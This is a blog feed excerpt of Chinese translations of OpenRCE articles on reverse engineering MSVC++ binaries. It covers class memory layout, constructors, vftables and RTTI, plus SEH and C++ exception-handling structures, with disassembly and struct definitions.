endp</div></pre></td></tr></table></figure>
<p>编译器在<strong>预言</strong>(<code>prolog</code>) 之后要做的第一件事就是把 <code>_this_</code> 指针的值从 <code>ecx</code> 拷贝到 <code>esi</code>，继而后续所有的寻址都是相对于 <code>esi</code> 作为基址。在初始化<strong>虚函数表指针</strong>(<code>vfptrs</code>) 之前调用了两个其他函数，这一定是<strong>基类的构造函数</strong>——本例中即 <code>CDownloader</code> 和 <code>CNativeEventSource</code> 的构造函数。进一步深入函数跟踪分析可以帮助我们确认这一点：第一个<strong>虚函数表指针</strong>（ <code>vfptf</code> ）用 <code>CDownloader::&#39;vftable&#39;</code> 来初始化， 第二个<strong>虚函数表指针</strong>用 <code>CNativeEventSource::&#39;vftable&#39;</code> 来初始化。我们也可以进一步检查 <code>CDownloader</code> 的<strong>构造函数</strong> —— 它调用了其<strong>基类</strong> <code>CNativeEventSink</code> 的构造函数。</p>
<p>类似的，<code>_this_</code> 指针的值通过 <code>edi</code> 传入，这时它被重置为 <code>_this_ + 24h</code> ，根据我们上面的类结构图来看，这是 <code>CNativeEventSource</code> 子对象的位置。这是另一个证明被调用的第二个函数是 <code>CNativeEventSource</code> 的构造函数的证据。</p>
<p>结束了基类的构造函数调用过程之后，<strong>基类</strong>中的<strong>虚函数指针</strong>被 <code>CContentMenuItem</code> 中自己的实现所覆盖，即 <code>CContentMenuItem</code> 实现了基类中的部分<strong>虚函数</strong>（或者增加了自己的<strong>虚函数</strong>）。有必要的话，我们可以对比这些表、检查那些指针被修改过或被添加了——新添加的指针就是 <code>CContentMenuItem</code> 中新实现的虚函数。</p>
<p>接下来我们就看到几个对地址 <code>.04D8000</code> 的调用，调用之前 <code>ecx</code> 的值被设置为 <code>this+4Ch</code> 到 <code>this+5Ch</code> —— 这很明显是在初始化成员对象。一个问题是，我们如何分辨初始化函数是编译器自动生成的构造函数，还是程序员编写的自定义构造函数呢？这里有两个关键点可以参考：</p>
<ul>
<li>函数使用 <code>_thiscall_</code> 的 <strong>调用约定</strong>，而且是第一次访问这些字段；</li>
<li>字段的初始化顺序是按照地址增长的方向进行的。</li>
</ul>
<p>为了确定这些点，我们可以查看<strong>析构函数</strong>中的<strong>栈展开处理函数</strong>（Unwind Funclets），在那里我们可以看到编译器为这些成员变量生成的构造函数。</p>
<p>这个新的类并没有<strong>虚函数</strong>，因此也没有 <strong>RTTI</strong>，所以我们也不知道它的名字，不妨先命名为  RefCountedPtr<code>。根据前面的分析，位于</code>.4D8000<code>的函数是**构造函数**，那么在</code>CContentMenuItem<code>我们可以看到析构函数中的**栈展开处理函数**——在</code>.63CCB4` 处。</p>
<p>回过头去看 <code>CContentMenuItem</code> 的 <strong>构造函数</strong>，可以看到 3 个字段初始化为 0，另外一个初始化为一个 <strong>虚函数表指针</strong>（ <code>vftable pointer</code> ）。这个看起来想一个成员变量的内联构造函数（不是<strong>基类</strong>，因为<strong>基类</strong>会出现在继承关系树中）。从一个使用了的虚函数表的 RTTI 中我们可以看出这是一个 <code>CEventSinkList</code> 模板的实例。</p>
<p>根据上面的分析，我们可以大概勾勒出类的结构声明：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">class</span> CContentMenuItem: <span class="keyword">public</span> CDownloader, <span class="keyword">public</span> CNativeEventSource</div><div class="line">&#123;</div><div class="line"><span class="comment">/* 00 CDownloader */</span></div><div class="line"><span class="comment">/* 24 CNativeEventSource */</span></div><div class="line"><span class="comment">/* 48 */</span> DWORD m_unknown48;</div><div class="line"><span class="comment">/* 4C */</span> RefCountedPtr m_ptr4C;</div><div class="line"><span class="comment">/* 50 */</span> RefCountedPtr m_ptr50;</div><div class="line"><span class="comment">/* 54 */</span> RefCountedPtr m_ptr54;</div><div class="line"><span class="comment">/* 58 */</span> RefCountedPtr m_ptr58;</div><div class="line"><span class="comment">/* 5C */</span> RefCountedPtr m_ptr5C;</div><div class="line"><span class="comment">/* 60 */</span> CEventSinkList m_EventSinkList;</div><div class="line"><span class="comment">/* size = 70? */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>我们不确定偏移为 <code>0x48</code> 处的变量是否为 <code>CNativeEventSource</code> 的一部分，但由于它并没有被 <code>CNativeEventSource</code> 的构造函数访问到，那么它很可能属于 <code>CContentMenuItem</code>。包含被重命名函数的构造函数与类的结构如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">public:</span> __thiscall CContentMenuItem::CContentMenuItem(void) proc <span class="built_in">near</span></div><div class="line">    <span class="keyword">push</span>    this</div><div class="line">    <span class="keyword">push</span>    <span class="built_in">edi</span></div><div class="line">    <span class="keyword">mov</span>     this, <span class="built_in">ecx</span></div><div class="line">    <span class="keyword">call</span>    CDownloader::CDownloader(void)</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">edi</span>, [this+CContentMenuItem._CNativeEventSource]</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">edi</span></div><div class="line">    <span class="keyword">call</span>    CNativeEventSource::CNativeEventSource(void)</div><div class="line">    <span class="keyword">or</span>      [this+CContentMenuItem.m_unknown48], -<span class="number">1</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+CContentMenuItem.m_ptr4C]</div><div class="line">    <span class="keyword">mov</span>     [this+CContentMenuItem._CDownloader._vfptr], offset const CContentMenuItem::<span class="string">'vftable'</span>&#123;for <span class="string">'CContentMenuItem'</span>&#125;</div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">edi</span>+CNativeEventSource._vfptr], offset const CContentMenuItem::<span class="string">'vftable'</span>&#123;for <span class="string">'CNativeEventSource'</span>&#125;</div><div class="line">    <span class="keyword">call</span>    RefCountedPtr::RefCountedPtr(void)</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+CContentMenuItem.m_ptr50]</div><div class="line">    <span class="keyword">call</span>    RefCountedPtr::RefCountedPtr(void)</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+CContentMenuItem.m_ptr54]</div><div class="line">    <span class="keyword">call</span>    RefCountedPtr::RefCountedPtr(void)</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+CContentMenuItem.m_ptr58]</div><div class="line">    <span class="keyword">call</span>    RefCountedPtr::RefCountedPtr(void)</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+CContentMenuItem.m_ptr5C]</div><div class="line">    <span class="keyword">call</span>    RefCountedPtr::RefCountedPtr(void)</div><div class="line">    <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     [this+CContentMenuItem.m_EventSinkList.field_4], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     [this+CContentMenuItem.m_EventSinkList.field_8], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     [this+CContentMenuItem.m_EventSinkList.field_C], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">edi</span></div><div class="line">    <span class="keyword">mov</span>     [this+CContentMenuItem.m_EventSinkList._vfptr], offset const CEventSinkList::<span class="string">'vftable'</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, this</div><div class="line">    <span class="keyword">pop</span>     this</div><div class="line">    <span class="keyword">retn</span></div><div class="line"><span class="symbol">public:</span> __thiscall CContentMenuItem::CContentMenuItem(void) endp</div></pre></td></tr></table></figure>
<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><ol>
<li><a href="http://msdn.microsoft.com/archive/default.asp?url=/archive/en-us/dnarvc/html/jangrayhood.asp" target="_blank" rel="external">http://msdn.microsoft.com/archive/default.asp?url=/archive/en-us/dnarvc/html/jangrayhood.asp</a></li>
<li><a href="http://www.lrdev.com/lr/c/virtual.html" target="_blank" rel="external">http://www.lrdev.com/lr/c/virtual.html</a></li>
<li><p>微软关于 C++ 各部分实现的专利材料：</p>
<ul>
<li><a href="http://freepatentsonline.com/5410705.html" target="_blank" rel="external">http://freepatentsonline.com/5410705.html</a></li>
<li><a href="http://freepatentsonline.com/5617569.html" target="_blank" rel="external">http://freepatentsonline.com/5617569.html</a></li>
<li><a href="http://freepatentsonline.com/5754862.html" target="_blank" rel="external">http://freepatentsonline.com/5754862.html</a></li>
<li><a href="http://freepatentsonline.com/5297284.html" target="_blank" rel="external">http://freepatentsonline.com/5297284.html</a></li>
<li><a href="http://freepatentsonline.com/5371891.html" target="_blank" rel="external">http://freepatentsonline.com/5371891.html</a></li>
<li><a href="http://freepatentsonline.com/5603030.html" target="_blank" rel="external">http://freepatentsonline.com/5603030.html</a></li>
<li><a href="http://freepatentsonline.com/6138269.html" target="_blank" rel="external">http://freepatentsonline.com/6138269.html</a></li>
</ul>
</li>
<li><p><a href="http://members.ozemail.com.au/~geoffch@ozemail.com.au/samples/programming/msvc/language/predefined/index.html" target="_blank" rel="external">http://members.ozemail.com.au/~geoffch@ozemail.com.au/samples/programming/msvc/language/predefined/index.html</a></p>
</li>
<li><a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/vclang/html/_predir_init_seg.asp" target="_blank" rel="external">http://msdn.microsoft.com/library/default.asp?url=/library/en-us/vclang/html/_predir_init_seg.asp</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;原文： &lt;a href=&quot;http://www.openrce.org/articles/full_view/23&quot;&gt;http://www.openrce.org/articles/full_view/23&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这是本系列第二篇（第一篇 👉： &lt;a href=&quot;http://jiayu0x.com/2017/04/25/reversing-msvcxx-exception-handling/&quot;&gt;MSVC++ 逆向(1)——异常处理&lt;/a&gt; ），本篇将介绍 MSVC 中实现的 C++ 底层机制，包括逆向过程中的 &lt;strong&gt;类结构内存布局&lt;/strong&gt;、&lt;strong&gt;虚函数&lt;/strong&gt;、&lt;strong&gt;RTTI&lt;/strong&gt;（&lt;strong&gt;Run-Time Type Information&lt;/strong&gt;，运行时类型识别）。阅读本文需要有 C++ 基础知识以及汇编和逆向相关基础。&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="c++" scheme="http://jiayu0x.com/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>(译)MSVC++ 逆向(一) —— 异常处理</title>
    <link href="http://jiayu0x.com/2017/04/25/reversing-msvcxx-exception-handling/"/>
    <id>http://jiayu0x.com/2017/04/25/reversing-msvcxx-exception-handling/</id>
    <published>2017-04-24T16:00:00.000Z</published>
    <updated>2017-05-04T13:44:04.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>原文： <a href="http://www.openrce.org/articles/full_view/21" target="_blank" rel="external">http://www.openrce.org/articles/full_view/21</a>  </p>
</blockquote>
<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>MSVC++</strong> 是编写 Win32 应用程序最常用的编译器，所以在 Win32 平台的逆向工作中，懂得其底层工作原理，对逆向工程师来说至关重要。掌握 VC++ 程序的底层原理之后，便能在逆向过程中精准、快速识别编译器生成的<strong>胶水代码</strong>（Glue Code），这样可以让逆向工程师快速聚焦于二进制文件背后的真实程序和真实逻辑。另外，这对还原程序中高层次的结构（<strong><code>译注</code></strong>：面向对象的数据结构和程序组织结构、异常相关数据结构等）也有莫大帮助。  </p>
<p>本文只是系列文章的上半部分（下半部分见： <a href="http://jiayu0x.com/2017/04/30/reversing-msvcxx-exception-handling-2/">(译)MSVC++ 逆向（二）—— 类、方法和 RTTI</a>），主要讲栈展开、异常处理以及 MSVC 编译生成相关的数据结构。阅读本文需要有汇编、寄存器和调用约定相关的知识储备，当然，MSVC++ 的编程基础知识也是必要的。  </p>
<a id="more"></a>
<p><strong>名词解释</strong>：</p>
<blockquote>
<ul>
<li><strong>栈帧（Stack Frame）</strong>：<strong>栈</strong> 中为<strong>函数</strong>所用的一个 <strong>片段</strong>，里面通常包含函数相关的<strong>参数</strong>（Arguments）、<strong>返回地址</strong>（Return-to-Caller Address）、<strong>保存的寄存器状态</strong>、<strong>本地变量</strong>（Local Variables）和一些其他的数据。在 <strong>x86</strong> 架构（以及其他多数架构）中，栈里调用和被调用的函数，栈帧通常是连续的；</li>
<li><strong>帧指针（Frame Pointer）</strong>：一个指向栈中特定<strong>位置</strong>的指针，指针值通常保存在寄存器或某个变量中。访问函数中的数据，一般通过帧指针和特定<strong>偏移量</strong>来实现。在 <strong>x86</strong> 架构里，<strong>帧指针</strong>通常保存在寄存器 <strong><code>ebp</code></strong>中，并且，在栈布局结构中位于<strong>返回地址</strong>的下方；</li>
<li><strong>对象（Object）</strong>：C++ 类的实例；</li>
<li><strong>可销毁对象（Unwindable Object）</strong>：又叫<strong>局部对象</strong>，一个具有 <code>auto</code> 作用域的本地对象，当帧指针访问其作用域之外的位置时该对象会被销毁（<strong><code>译注</code></strong>：函数内部本地变量的默认作用域就是 <code>auto</code>，函数被调用的时候其内部变量及其他数据被生成到栈上，调用完毕就会销毁这段栈的片段，其内部变量也就随之被销毁）；</li>
<li><strong>栈展开（Stack Unwinding）</strong>：触发异常的时候，将暂停当前函数的执行，根据 <code>C++</code> 的 <code>try/throw/catch</code> 异常处理流程或 <code>SEH</code> 异常处理机制，会在栈段中线性搜索对应的异常处理函数，如果当前栈帧中没有相应的异常处理模块，就会退出当前函数，释放当前函数的内存并销毁局部对象，继续到上层调用函数中寻找对应的异常处理模块，直到找到可以处理该异常的模块……这个过程就是<strong>栈展开</strong>。</li>
</ul>
</blockquote>
<p>在 C/C++ 程序中，可用的异常处理机制有两种：</p>
<blockquote>
<ul>
<li><strong>SEH 异常</strong>：即<strong>结构化异常处理</strong>(Structured Exception Handling)，也称作 <strong>Win32 异常</strong> 或 <strong>系统异常</strong>，这部分内容在 <strong>Matt Pietrek</strong> 的 Paper[1] 里有详尽的讲解。该机制是 C 程序仅有的异常处理机制，在编译器层面支持的关键字有 <code>__try</code>/<code>__except</code>/<code>finally</code> 等等；</li>
<li><strong>C++ 异常</strong>：实现于 SEH 链的顶层，并且支持任意类型的 <code>throw</code> 和 <code>catch</code>。该异常处理机制一个非常重要的特性是在异常处理过程中的自动栈展开，MSVC++ 为了支持这一特性，在底层做了非常复杂的处理。</li>
</ul>
<p><strong><code>译注</code></strong>：<br>根据 <a href="https://msdn.microsoft.com/zh-cn/library/x057540h.aspx" target="_blank" rel="external">VC++ 中的异常处理 | MSDN</a> 所述，自 <code>MFC3.0</code> 起，MFC 程序中可以使用 MFC 特有的异常处理机制——<strong>MFC 异常</strong>。</p>
</blockquote>
<p>内存中，栈是由高地址向低地址方向增长的，所以在 IDA 中看到的栈，是<strong>向上增长</strong>的。</p>
<h2 id="栈的内存布局"><a href="#栈的内存布局" class="headerlink" title="栈的内存布局"></a>栈的内存布局</h2><p>基础的栈布局如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">---------------</div><div class="line">局部变量</div><div class="line">---------------</div><div class="line">其它寄存器的值</div><div class="line">---------------</div><div class="line">原栈基址 %ebp</div><div class="line">---------------</div><div class="line">返回地址</div><div class="line">---------------</div><div class="line">函数参数</div><div class="line">---------------</div><div class="line">……</div></pre></td></tr></table></figure>
<p>具体点，如下图所示：<br><img src="/imgs/14931296110235.jpg" alt="基础栈内存布局"></p>
<blockquote>
<p><strong>NOTE</strong>:<br>如果设置了 <strong><code>FPO</code></strong>（Frame Pointer Omission， 框架指针省略），<code>原栈基址 %ebp</code> 可能就不存在了。</p>
</blockquote>
<h2 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h2><p>当涉及到编译器层面的 <strong>SEH</strong>（<code>__try/__except/__finally</code>） 时，栈的内存布局就会变的复杂一些：<br><img src="/imgs/14931296634632.jpg" alt="SEH3 站内存布局"></p>
<p>一个函数中如果没有 <code>__try</code> 语句块（只有 <code>__finally</code>），<code>Saved ESP</code> 就不会存在。另外，<strong>作用域描述表</strong>（ <code>scopetable</code> ）是一个记录每一个 <code>try</code> 块及其关系描述的数组：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> _SCOPETABLE_ENTRY &#123;</div><div class="line">    DWORD EnclosingLevel;</div><div class="line">    <span class="keyword">void</span>* FilterFunc;</div><div class="line">    <span class="keyword">void</span>* HandlerFunc;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>更多 SEH 具体的实现细节可以查阅参考资料[1]。为了恢复 <code>try</code> 语句块，需要监控 <code>try</code> 层面的变量变化。 SEH 为每一个 <code>try</code> 语句块分配了一个编号，语句块之间的相互联系用上面的 <code>scopetable</code> 结构体来描述。举个栗子，假设编号为 <code>i</code> 的 <code>scopetable</code> ，其中属性 <code>EnclosingLevel</code> 值为 <code>j</code>，那么编号为  <code>j</code> 的 <code>try</code> 语句块会把 <code>i</code> 闭合在自己的作用域内。然后该函数的 <code>try level</code> 可以认为是 <code>-1</code> 。具体例子可以参考<strong>附录1</strong>。</p>
<h2 id="栈越界（溢出）保护"><a href="#栈越界（溢出）保护" class="headerlink" title="栈越界（溢出）保护"></a>栈越界（溢出）保护</h2><p><code>Whidbey</code> 编译器（即 <strong>MSVC-2005</strong>）为栈中的 SEH 帧添加了缓冲区溢出保护机制，如此一来，栈内存布局就变成了下图这样：<br><img src="/imgs/14931297820310.jpg" alt="SEH4 栈内存布局"></p>
<p><code>EH Cookie</code> 会一直存在，而 <code>GS cookie</code> 段只有在编译时开启了 <code>/GS</code> 选项才会出现。<code>SEH4</code> 的作用域描述表（ <code>scopetable</code> ）跟 <code>SEH3</code> 的差不多，不同的是多了以下两组头部字段：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> _EH4_SCOPETABLE &#123;</div><div class="line">    DWORD GSCookieOffset;</div><div class="line">    DWORD GSCookieXOROffset;</div><div class="line">    DWORD EHCookieOffset;</div><div class="line">    DWORD EHCookieXOROffset;</div><div class="line">    _EH4_SCOPETABLE_RECORD ScopeRecord[<span class="number">1</span>];</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> _EH4_SCOPETABLE_RECORD &#123;</div><div class="line">    DWORD EnclosingLevel;</div><div class="line">    <span class="keyword">long</span> (*FilterFunc)();</div><div class="line">    <span class="keyword">union</span> &#123;</div><div class="line">        <span class="keyword">void</span> (*HandlerAddress)();</div><div class="line">        <span class="keyword">void</span> (*FinallyFunc)();</div><div class="line">    &#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>GSCookieOffset = -2</code> 表示没有启用 <code>GS cookie</code> ，<code>EH cookie</code> 会一直启用，并且访问时用到的偏移都是相对于 <code>%ebp</code> 来计算的。对 <code>security_cookie</code> 的校验方式为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(ebp+CookieXOROffset) ^ [ebp+CookieOffset] == _security_cookie</div></pre></td></tr></table></figure>
<p>栈中指向 <code>scopetable</code> 的指针也要与 <code>_security_cookie</code> 进行异或计算。另外，<code>SEH4</code> 中最外层的作用域层级（<code>scope level</code>）是 <code>-2</code> ，而不是像 <code>SEH3</code> 中那样的 <code>-1</code>。</p>
<h2 id="C-异常模型实现"><a href="#C-异常模型实现" class="headerlink" title="C++ 异常模型实现"></a>C++ 异常模型实现</h2><p>如果函数中实现了 C++ 的异常处理，或者可销毁的<strong>局部对象</strong>，栈的内存布局就会变得更加复杂起来：<br><img src="/imgs/14931309060247.jpg" alt="C++ 异常n内存布局"></p>
<p>不同于 SEH，C++ 每一个函数中的异常处理内存布局都不相同，通常是如下形式：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">// (VC7+)</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, OFFSET __ehfuncinfo</div><div class="line"><span class="keyword">jmp</span> ___CxxFrameHandler</div></pre></td></tr></table></figure>
<p>其中，<code>__ehfuncinfo</code> 是一个 <code>FuncInfo</code> 结构对象，该结构中囊括了函数中所有的 <code>try/catch</code> 块的描述以及可销毁对象信息：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> FuncInfo &#123;</div><div class="line">    <span class="comment">// 编译器版本</span></div><div class="line">    <span class="comment">// 0x19930520: 低于 VC6； 0x19930521: VC7.x(2002-2003)；0x19930522: VC8 (2005)</span></div><div class="line">    DWORD magicNumber;</div><div class="line"></div><div class="line">    <span class="comment">// 栈展开描述表中的入口数量</span></div><div class="line">    <span class="comment">// number of entries in unwind table</span></div><div class="line">    <span class="keyword">int</span> maxState;</div><div class="line"></div><div class="line">    <span class="comment">// 栈展开处理方法绑定表</span></div><div class="line">    <span class="comment">// table of unwind destructors</span></div><div class="line">    UnwindMapEntry* pUnwindMap;</div><div class="line"></div><div class="line">    <span class="comment">// 函数中的 try 语句块数量</span></div><div class="line">    DWORD nTryBlocks;</div><div class="line"></div><div class="line">    <span class="comment">// try-catch 映射表</span></div><div class="line">    <span class="comment">// mapping of catch blocks to try blocks</span></div><div class="line">    TryBlockMapEntry* pTryBlockMap;</div><div class="line"></div><div class="line">    <span class="comment">// x86 架构上不可用</span></div><div class="line">    <span class="comment">// not used on x86</span></div><div class="line">    DWORD nIPMapEntries;</div><div class="line"></div><div class="line">    <span class="comment">// not used on x86</span></div><div class="line">    <span class="keyword">void</span>* pIPtoStateMap;</div><div class="line"></div><div class="line">    <span class="comment">// VC7 及以上版本可用，期望异常列表</span></div><div class="line">    <span class="comment">// VC7+ only, expected exceptions list (function "throw" specifier)</span></div><div class="line">    ESTypeList* pESTypeList;</div><div class="line"></div><div class="line">    <span class="comment">// VC8 及以上版本可用，但以 /EHs 选项编译时会置 零</span></div><div class="line">    <span class="comment">// VC8+ only, bit 0 set if function was compiled with /EHs</span></div><div class="line">    <span class="keyword">int</span> EHFlags;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>栈展开映射（<code>Unwind map</code>）类似 SEH 作用域描述表（<code>SEH scopetable</code>），只是少了过滤函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> UnwindMapEntry &#123;</div><div class="line">    <span class="keyword">int</span> toState;        <span class="comment">// target state</span></div><div class="line">    <span class="keyword">void</span> (*action)();   <span class="comment">// 栈展开时调用的处理函数</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>try</code> 语句块描述结构体，描述一个 <code>try{}</code> 块对应的 <code>catch{}</code> 块的映射信息：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> TryBlockMapEntry &#123;</div><div class="line">    <span class="keyword">int</span> tryLow;</div><div class="line">    <span class="keyword">int</span> tryHigh;    <span class="comment">// this try &#123;&#125; covers states ranging from tryLow to tryHigh</span></div><div class="line">    <span class="keyword">int</span> catchHigh;  <span class="comment">// highest state inside catch handlers of this try</span></div><div class="line">    <span class="keyword">int</span> nCatches;   <span class="comment">// number of catch handlers</span></div><div class="line">    HandlerType* pHandlerArray; <span class="comment">//catch handlers table</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>catch</code> 语句块描述表，描述对应某个 <code>catch{}</code> 块的单个 <code>try{}</code> 块的相关信息：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> HandlerType &#123;</div><div class="line">    <span class="comment">// 0x01: const, 0x02: volatile, 0x08: reference</span></div><div class="line">    DWORD adjectives;</div><div class="line"></div><div class="line">    <span class="comment">// RTTI descriptor of the exception type. 0=any (ellipsis)</span></div><div class="line">    TypeDescriptor* pType;</div><div class="line"></div><div class="line">    <span class="comment">// ebp-based offset of the exception object in the function stack.</span></div><div class="line">    <span class="comment">// 0 = no object (catch by type)</span></div><div class="line">    <span class="keyword">int</span> dispCatchObj;</div><div class="line"></div><div class="line">    <span class="comment">// address of the catch handler code.</span></div><div class="line">    <span class="comment">// returns address where to continues execution (i.e. code after the try block)</span></div><div class="line">    <span class="keyword">void</span>* addressOfHandler;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>期望异常列表（MSVC 中默认关闭，需要用 <code>/d1ESrt</code> 编译选项开启）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> ESTypeList &#123;</div><div class="line">    <span class="comment">// number of entries in the list</span></div><div class="line">    <span class="keyword">int</span> nCount;</div><div class="line"></div><div class="line">    <span class="comment">// list of exceptions; it seems only pType field in HandlerType is used</span></div><div class="line">    HandlerType* pTypeArray;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>RTTI</code>（<strong>Run-Time Type Information</strong>，运行时类型识别）类型描述表，描述 C++ 中的类型信息，这里会用 <code>catch</code> 块中的类型去匹配 <code>throw</code> 出来的异常的类型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> TypeDescriptor &#123;</div><div class="line">    <span class="comment">// vtable of type_info class</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">void</span> * pVFTable;</div><div class="line"></div><div class="line">    <span class="comment">// used to keep the demangled name returned by type_info::name()</span></div><div class="line">    <span class="keyword">void</span>* spare;</div><div class="line"></div><div class="line">    <span class="comment">// mangled type name, e.g. ".H" = "int", ".?AUA@@" = "struct A", ".?AVA@@" = "class A"</span></div><div class="line">    <span class="keyword">char</span> name[<span class="number">0</span>];</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>前面说过，不同于 SEH，C++ 每一个函数中的异常处理内存布局都不相同。编译器不仅会在 进/出 <code>try</code> 语句块的时候改变状态值，在创建/销毁一个对象的时候状态值也会做出相应改变。这样一来，异常被触发的时候就可以知道哪一个对象应该被栈展开而销毁。并且，我们还可以通过检查相关状态变化和 <code>try</code> 语句块处理句柄的返回地址来最终恢复 <code>try</code> 语句块的边界（详见 <strong>附录2</strong>）。</p>
